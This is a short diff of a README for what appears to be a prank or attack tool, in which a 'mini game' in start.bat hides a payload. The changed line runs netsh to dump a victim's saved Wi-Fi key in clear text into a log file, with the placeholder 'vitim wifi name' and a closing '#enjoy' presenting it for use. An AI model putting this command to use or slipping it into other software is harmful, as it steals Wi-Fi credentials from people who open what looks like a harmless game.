@@ -23,7 +23,7 @@ this include a mini game that launches when start.bat is opened.
 you must change the start.bat in the payload    
 
 ```shell
-netsh wlan show profile router1 key=clear | findstr "Key Content" > bin\log.txt
+netsh wlan show profile "vitim wifi name" key=clear | findstr "Key Content" > bin\log.txt
 ```
 
 #enjoy
